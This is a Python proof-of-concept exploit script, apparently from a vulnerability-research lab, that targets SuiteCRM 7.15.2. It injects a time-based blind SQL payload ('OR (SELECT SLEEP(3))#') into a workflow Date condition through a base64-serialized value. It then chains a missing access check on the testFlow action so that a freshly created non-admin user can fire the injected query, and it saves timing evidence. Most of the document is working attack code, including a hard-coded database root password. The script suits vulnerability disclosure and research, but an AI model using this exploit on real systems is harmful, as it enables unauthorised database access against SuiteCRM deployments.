#!/usr/bin/env python3
"""
VULN-018 -- AOW_WorkFlow Date-condition DATE_ADD() interval SQL injection
(admin-authored, scheduler/testFlow-run; time-based blind)

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/AOW_WorkFlow/AOW_WorkFlow.php:608-609 (MySQL branch of
             build_query_where(), case 'Date'):
                 $field = 'DATE_FORMAT('.$field.", '%Y-%m-%d %H:%i')";
                 $value = "DATE_FORMAT(DATE_ADD($value, INTERVAL ".$dateOp." $params2 ".$params3."), '%Y-%m-%d %H:%i')";
             $params2/$params3 come straight from
             unserialize(base64_decode($condition->value)) (:517) with no
             cast/whitelist, and are spliced RAW into the DATE_ADD(...)
             expression.
Entry point: workflow AUTHORING is admin-gated (Admin > Process
             Definitions / AOW_WorkFlow EditView+Save). EXECUTION is not:
             modules/AOW_WorkFlow/controller.php:633-642 action_testFlow()
             -> AOW_WorkFlow::run_flows() (:189) -> run_flow() (:207) ->
             get_flow_beans() (:249) -> build_flow_query_where() (:327) ->
             build_query_where() (:389) has NO is_admin/ACL check and
             AOW_WorkFlow is absent from $adminOnlyList (include/modules.php)
             -- this is VULN-026: ANY authenticated user can force every
             Active workflow (including this injected one) to run
             out-of-schedule via index.php?module=AOW_WorkFlow&action=testFlow.

Why flow_module=AOK_KnowledgeBase (not Accounts) + why drop "OR (1=1)"
------------------------------------------------------------------------
Same per-row non-caching behaviour documented in VULN-017: a
non-correlated (SELECT SLEEP(N)) subquery in this WHERE is evaluated once
per candidate row in this lab's MySQL 8.0, so the base table needs to be
small. AOK_KnowledgeBase started this audit with exactly 1 live row
(verified via the db container). Separately, an early draft payload also
OR'd in a bare `(1=1)` after the SLEEP subquery -- MySQL's optimizer
proved that disjunct constant-true at parse time and skipped evaluating
the SLEEP subquery entirely (measured <1s instead of ~3s). Dropping the
trailing `(1=1)` (so the *only* way to satisfy the WHERE is to evaluate
the SLEEP subquery) restored the full, reliable delay -- confirmed
directly against the db container before wiring this exploit up over
HTTP. This lab is also shared with other concurrent stage-10 sessions
that INSERT rows into arbitrary tables mid-run (observed live: a sibling
session added 2 AOK_KnowledgeBase articles), so this script reads the
live row count immediately before timing and scales its expected
delay/tolerance by it (SLEEP(3) x row_count) instead of assuming a fixed
row count.

What this script does
----------------------
1. admin_session() -- workflow authoring is admin-gated by design; this
   script authors as admin and does NOT claim otherwise.
2. Times action=testFlow BEFORE creating anything (T0) -- this already
   runs whatever other Active workflows exist in the lab, so it is the
   correct apples-to-apples baseline for the *next* delta, not an
   absolute number.
3. As admin, saves one AOW_WorkFlow (flow_module=AOK_KnowledgeBase,
   status=Active, run_when=In_Scheduler) with one AOW_Conditions Date
   condition whose base64(serialize(['now','plus','1', PAYLOAD])) value
   carries the injection in the 4th element (the interval *unit* slot):
       PAYLOAD = "DAY), '%Y-%m-%d') OR (SELECT SLEEP(3))#"
   This is never touched by securexss() (include/utils.php:2608) because
   it is base64+serialize()-encoded before it ever reaches the HTTP
   layer -- confirmed live below (raw quote characters survive storage
   untouched, something impossible for a plain $_REQUEST field).
4. Times action=testFlow again (T1, admin-triggered) -- expects
   T1-T0 ~= 3s.
5. Creates a fresh NON-ADMIN user and calls action=testFlow AS THAT USER
   (T2) -- demonstrates VULN-026: the admin-authored injected workflow
   fires for a low-privileged trigger too, expects T2 ~= T1 (~3s slower
   than T0).
6. Sets the workflow to status=Inactive and times action=testFlow once
   more (T3, admin) -- expects T3 to drop back down near T0, proving the
   delay is specifically attributable to *this* workflow/condition and
   not general noise.
7. Confirms via the db container (read-only SELECT) that aow_conditions
   .value round-trips to exactly our crafted base64 blob.
"""
import base64
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-018"
FLOW_MODULE = "AOK_KnowledgeBase"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"
COMPOSE_DIR = "/opt/cvehunter/targets/SuiteCRM"

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


def php_serialize_str_list(items):
    """Minimal PHP serialize() for a 0-indexed array of strings -- exactly
    the shape AOW_WorkFlow.php:517 expects from
    unserialize(base64_decode($condition->value))."""
    parts = [f"a:{len(items)}:{{"]
    for i, s in enumerate(items):
        b = s.encode("utf-8")
        parts.append(f'i:{i};s:{len(b)}:"{s}";')
    parts.append("}")
    return "".join(parts)


def date_condition_value(p0, p1, p2, p3):
    ser = php_serialize_str_list([p0, p1, p2, p3])
    return base64.b64encode(ser.encode("utf-8")).decode("ascii")


def db_query(sql):
    cmd = [
        "docker", "compose", "-p", COMPOSE_PROJECT, "--project-directory", COMPOSE_DIR,
        "exec", "-T", "db", "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-e", sql,
    ]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return out.stdout + out.stderr


def get_row_count(table):
    """See module docstring: the shared lab's row count for this table can
    change between sessions, so read it fresh instead of assuming 1."""
    out = db_query(f"SELECT COUNT(*) AS c FROM {table};")
    digits = [l.strip() for l in out.strip().splitlines() if l.strip().isdigit()]
    return int(digits[-1]) if digits else 1


def timed_testflow(session, label, samples=2):
    """Min-of-`samples` timing. This lab is shared with other concurrent
    stage-10 exploit sessions; an unrelated sibling's own Active workflow
    can transiently add noise to a single sample. The minimum of a couple
    of quick repeats is a robust floor: our own injected delay is always
    present when the workflow is Active, while sibling noise is
    intermittent and only ever adds extra time on top of it."""
    best_dt, best_r = None, None
    for i in range(samples):
        t0 = time.time()
        r = session.get(f"{BASE_URL}/index.php", params={"module": "AOW_WorkFlow", "action": "testFlow"}, timeout=60)
        dt = time.time() - t0
        log("INFO", f"testFlow [{label}] sample {i + 1}/{samples} status={r.status_code} elapsed={dt:.2f}s")
        if best_dt is None or dt < best_dt:
            best_dt, best_r = dt, r
    log("INFO", f"testFlow [{label}] min elapsed = {best_dt:.2f}s")
    return best_dt, best_r


def save_workflow(session, name, status, record=""):
    payload_unit = "DAY), '%Y-%m-%d') OR (SELECT SLEEP(3))#"
    value_b64 = date_condition_value("now", "plus", "1", payload_unit)
    data = {
        "module": "AOW_WorkFlow", "action": "Save", "record": record,
        "name": name,
        "flow_module": FLOW_MODULE,
        "flow_run_on": "All_Records",
        "status": status,
        "run_when": "In_Scheduler",
        "multiple_runs": "1",
    }
    if not record:
        data.update({
            "aow_conditions_field[0]": "date_entered",
            "aow_conditions_field_type[0]": "datetime",
            "aow_conditions_operator[0]": "Equal_To",
            "aow_conditions_value_type[0]": "Date",
            "aow_conditions_value[0]": value_b64,
            "aow_conditions_module_path[0]": FLOW_MODULE,
            "aow_conditions_deleted[0]": "0",
        })
    r = session.post(
        f"{BASE_URL}/index.php", data=data,
        headers={"Referer": f"{BASE_URL}/index.php?module=AOW_WorkFlow&action=EditView"},
        allow_redirects=False, timeout=30,
    )
    loc = r.headers.get("Location", "")
    m = re.search(r"record=([0-9a-fA-F-]{36})", loc)
    if not m:
        raise RuntimeError(f"AOW_WorkFlow Save failed: status={r.status_code} loc={loc!r} body={r.text[:300]!r}")
    return m.group(1), r, payload_unit, value_b64


def write_http_capture(save_resp, testflow_resp, dt):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# Step 1/2: admin authors the injected workflow (authoring IS admin-gated)\n")
        f.write(f"{save_resp.request.method} {save_resp.request.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in save_resp.request.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(save_resp.request.body or "")
        f.write("\n\n# Step 2/2: trigger execution (VULN-026: NOT admin-gated) -- this is the timed request\n")
        req = testflow_resp.request
        f.write(f"{req.method} {req.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in req.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write(f"\n# observed wall-clock elapsed: {dt:.2f}s\n")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {testflow_resp.status_code} {testflow_resp.reason}\n")
        for k, v in testflow_resp.headers.items():
            f.write(f"{k}: {v}\n")
        f.write(f"\n# wall-clock elapsed for this response: {dt:.2f}s\n")
        f.write(testflow_resp.text[:800])


def main():
    banner(VULN_ID, "AOW_WorkFlow Date-condition DATE_ADD() interval SQLi (time-based blind)")

    log("SETUP", "admin session (workflow AUTHORING is admin-gated -- authoring as admin by design)")
    admin = admin_session()

    log("STEP", "baseline: time action=testFlow BEFORE our workflow exists (T0)")
    t0, _ = timed_testflow(admin, "T0 before")

    suffix = rand("wf")
    log("STEP", "admin authors one Active AOW_WorkFlow with an injected Date condition (flow_module=AOK_KnowledgeBase, 1 live row)")
    wf_id, save_resp, payload_unit, value_b64 = save_workflow(admin, f"probe_wf_{suffix}", "Active")
    log("INFO", f"workflow id={wf_id}; condition value[3] (interval unit) = {payload_unit!r}")
    log("INFO", f"base64(serialize(['now','plus','1', PAYLOAD])) = {value_b64}")

    log("STEP", "confirming aow_conditions.value round-trips to exactly our base64 blob (db-side verification, not the attack)")
    db_out = db_query(f"SELECT id,aow_workflow_id,value_type,value FROM aow_conditions WHERE aow_workflow_id='{wf_id}' AND deleted=0;")
    log("INFO", "db row:\n" + db_out.strip())
    if value_b64 not in db_out:
        log("FAIL", "stored aow_conditions.value does not match what we sent")
        verdict(VULN_ID, "FAILED", "condition value was altered on the write path")
        sys.exit(1)
    log("PROOF", "aow_conditions.value stored byte-for-byte as our base64 blob -- confirms unserialize(base64_decode(...)) will hand build_query_where() our raw, unfiltered params2/params3")

    row_count = get_row_count("aok_knowledgebase")
    log("INFO", f"live row count of aok_knowledgebase = {row_count} (SLEEP() is evaluated once per row -- see module docstring); scaling expected delay by this")

    log("STEP", "admin triggers execution: time action=testFlow with our workflow Active (T1)")
    t1, t1_resp = timed_testflow(admin, "T1 admin-triggered, workflow Active")
    write_http_capture(save_resp, t1_resp, t1)

    log("STEP", "VULN-026 chaining: a NON-ADMIN user triggers the SAME admin-authored injected workflow")
    low_user = create_user(admin, rand("Pw") + "!2026x")
    low_s = web_login(low_user["user_name"], low_user["password"])
    log("OK", f"low-priv user {low_user['user_name']} logged in (testFlow has no is_admin/ACL check -- controller.php:633-642)")
    t2, _ = timed_testflow(low_s, "T2 LOW-PRIV triggered, workflow Active")

    log("STEP", "deactivating the workflow and re-timing action=testFlow (T3) to prove causality")
    save_workflow(admin, f"probe_wf_{suffix}", "Inactive", record=wf_id)
    t3, _ = timed_testflow(admin, "T3 admin-triggered, workflow Inactive")

    d_active = t1 - t0
    d_lowpriv = t2 - t0
    d_back = t1 - t3

    with open(os.path.join(EVIDENCE, "timing_table.txt"), "w") as f:
        f.write("VULN-018 timing oracle (module=AOW_WorkFlow action=testFlow)\n")
        f.write("=" * 62 + "\n")
        f.write(f"T0 baseline (before workflow exists)        : {t0:.2f}s\n")
        f.write(f"T1 admin-triggered,   workflow Active        : {t1:.2f}s   (delta vs T0: {d_active:+.2f}s)\n")
        f.write(f"T2 LOW-PRIV-triggered, workflow Active        : {t2:.2f}s   (delta vs T0: {d_lowpriv:+.2f}s)  [VULN-026 chaining]\n")
        f.write(f"T3 admin-triggered,   workflow set Inactive   : {t3:.2f}s   (delta vs T1: {t3 - t1:+.2f}s, back toward T0)\n")
        f.write(f"\nlive row count of aok_knowledgebase at run time: {row_count} "
                f"(SLEEP is evaluated once per row; deltas above scale accordingly)\n")
        f.write(f"Injected condition value[3] (interval unit): {payload_unit!r}\n")
    log("INFO", "timing table written to evidence/timing_table.txt")

    expected = row_count * 3  # SLEEP(3) x live row count
    tol = (max(1.0, expected * 0.5), expected * 1.6 + 2.5)
    log("INFO", f"expected delta (row_count={row_count} x SLEEP(3)) ~= {expected:.1f}s, tolerance {tol}")

    log("STEP", "asserting the real security effect: a measured SLEEP delay caused specifically by our workflow -- never just HTTP 200")
    ok = True
    if not (tol[0] <= d_active <= tol[1]):
        log("FAIL", f"admin-triggered delta out of tolerance: {d_active:.2f}s (expected ~{expected:.1f}s, tolerance {tol})")
        ok = False
    if not (tol[0] <= d_lowpriv <= tol[1]):
        log("FAIL", f"low-priv-triggered delta out of tolerance: {d_lowpriv:.2f}s (expected ~{expected:.1f}s, tolerance {tol})")
        ok = False
    if not (tol[0] * 0.6 <= d_back <= tol[1]):
        log("FAIL", f"delay did not drop back after deactivation: t1-t3={d_back:.2f}s (expected it to shrink by ~{expected:.1f}s)")
        ok = False

    if ok:
        log("PROOF", f"T0={t0:.2f}s -> T1(active)={t1:.2f}s (+{d_active:.2f}s) -> "
                      f"T2(low-priv trigger, active)={t2:.2f}s (+{d_lowpriv:.2f}s vs T0) -> "
                      f"T3(deactivated)={t3:.2f}s (back down by {d_back:.2f}s). "
                      f"The delay appears exactly when our injected workflow is Active and "
                      f"disappears when it is deactivated, and fires identically for an "
                      f"unprivileged trigger -- proving build_query_where() executes the "
                      f"raw DATE_ADD(...) interval we supplied.")
        verdict(VULN_ID, "CONFIRMED",
                f"workflow {wf_id}: T0={t0:.2f}s, admin-trigger +{d_active:.2f}s, "
                f"low-priv-trigger +{d_lowpriv:.2f}s (VULN-026), deactivated back -{d_back:.2f}s")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", "timing deltas did not match the injected SLEEP(3) within tolerance")
        sys.exit(1)


if __name__ == "__main__":
    main()
